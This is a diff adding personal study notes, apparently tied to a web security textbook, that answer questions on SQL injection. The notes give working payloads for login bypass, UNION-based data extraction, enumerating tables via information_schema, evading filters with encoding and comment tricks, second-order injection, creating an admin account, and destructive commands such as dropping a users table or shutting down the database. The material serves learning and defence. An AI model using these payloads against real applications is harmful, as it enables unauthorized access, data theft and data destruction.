@@ -1,0 +1,141 @@
+- How could you bypass the login functionnality of with the following SQL statement?
+    SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’
+
+        SELECT * FROM users WHERE username = '' OR 1=1 --' and password = ‘secret’
+
+        what was sent by the user: ' OR 1=1 --
+
+- What (how) would you inject in the following query in order to modify it, but to not discard the rest of the query like in the above example?
+    SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ and published=1
+
+
+        SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR ‘a’=’a’ and published=1
+
+        what was sent by the user: Wiley’ OR ‘a’=’a
+
+- Is is possible for an attacker to take full control of the server via SQL injection?
+    Yes
+
+- Could it be possible to create an admin user with a SQL injection attack? How? (Give an example)
+    INSERT INTO users (username, password, ID, priveleges) VALUES (‘daf’, ‘secret’, 2248, 1)
+
+    ‘daf’, ‘secret’ are inputs
+
+    so with the input foo’, ‘bar’, 9999, 0)--
+
+    INSERT INTO users (username, password, ID, priveleges) VALUES (‘foo’, ‘bar’, 9999, 0)--, ‘secret’, 2248, 1)
+
+- Give an example of how an attacker could use SQL injection to bypass password check on a change password statement?
+    UPDATE users SET password=’newsecret’ WHERE user = ‘marcus’ and password = ‘secret’
+
+        with username value admin’--
+
+        UPDATE users SET password=’newsecret’ WHERE user = ‘admin’--’ and password = ‘secret’
+
+- What is the easiest way to detect a possible SQL injection vulnerability?
+    Input an unexpected character, for example '
+
+- Where can you typically inject a SQL statement?
+    String Data
+        Break out of the quotation mark
+    Numeric Data
+        Sometime the data is put between quotation mark, but most of the time it does not. In this case, you can try to send a mathematical expression that equals the original value (ex: 3-1), if it succeeds, it may be vulnerable. 
+    Query Structure
+        For example, with the order by clause, if it is supplied by the user, for exmaple to sort a list:
+            SELECT author, title, year FROM books WHERE publisher = ‘Wiley’ ORDER BY title ASC
+        title is directly given by the user, no escaping is necessary
+
+- What is the concequence to allow user to specify collumn names?
+    Using prepared statements or escaping single quotes won't prevent this type of injection.
+
+- What is fingerprinting the database? How would you do that?
+    It is to know what kind of technology is running the DB.
+    You usually send a payload that will work on one type of DB, but fail on all the others.
+
+    For example, string concatenation:
+        Oracle: 'serv'||'ices'
+        MS-SQL: 'serv'+'ices'
+        MySQL: 'serv' 'ices'
+
+- How would an attacker inject his own select statement in a query?
+    By using the union statement:
+        select author from books where title = 'banana' union select user from users --'
+
+        injected banana' union select user from users --
+
+- Give a strategy to inject a union blindly (do not know the tables attributes)
+    First, you need to know how many columns there are. In the select, add NULLs (they can be converted to any data type) until you have the right numbers (otherwise it will fail)
+
+        ' union select null--
+        ' union select null, null --
+        ' union select null, null, null --
+
+    Then you test for data type (will fail if is not the same or cannot be converted)
+
+        ' union select a, null, null --
+        ' union select null, a, null --
+        ' union select null, null, a --
+
+- How could an attacker extract the names of the tables and columns?
+    By querying the metadata table information_schema.columns
+        union select table_name, column_name, null, null, null from information_schema.columns--
+
+         SELECT table_name,column_name FROM all_tab_ columns (on Oracle)
+
+- How could you inject if ' is encoded/filtered?
+    Construct the string with ASCII value
+        select ename, sal from emp where ename=’marcus’:
+
+        is the same as:
+
+        SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)|| CHR(114)||CHR(99)||CHR(117)||CHR(115)
+
+- How can you inject if the comment symbol is blocked?
+    Craft the input such as it does not break the query
+         ‘ or 1=1--
+
+         you can inject: 
+
+         ‘ or ‘a’=’a
+
+- How could you circumvent simple validation? Ex: The SELECT statement is blocked or removed.
+    SeLeCt
+    %00SELECT
+    SELSELECTECT
+    %53%45%4c%45%43%54
+    %2553%2545%254c%2545%2543%2554
+
+- How can an attacker use SQL comments to bypass validation?
+    Simulating white spaces
+        SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
+
+    With MySQL, directly in the statements
+        SEL/*foo*/ECT username,password FR/*foo*/OM users
+
+- What is second-order SQL injection?
+    Lets say that the developpers have mitigated injection risk at user registration (for example, by doubling the ' when it is inputted)
+        myname'
+
+        insert into users values 'myname'''
+
+        so the literal myname' will be stored
+
+    Well, nothing says that the application is protected somewhere else, this data could be used somewhere else without any protection, for example, when changing the password:
+        SELECT password FROM users WHERE username = 'myname''
+
+        will break
+
+        this is where the attacker's payload would be executed, at somewhere else in the application.
+
+- What kind of destructive action can an attacker inject?
+    ' shutdown -- (turns off the db)
+    ' drop table users--
+
+- How could an attaker retrieve data as numbers? For example, when ' is handled properly.
+    By using ASCII, which returns the ASCII code of the letter and SUBSTRING which returns a sucstring of the output
+        SUBSTRING(‘Admin’,1,1) returns A. 
+        ASCII(‘A’) returns 65.
+
+        ASCII(SUBSTR(‘Admin’,1,1))
+
+ - p 317 (using an out-of-band channel)-
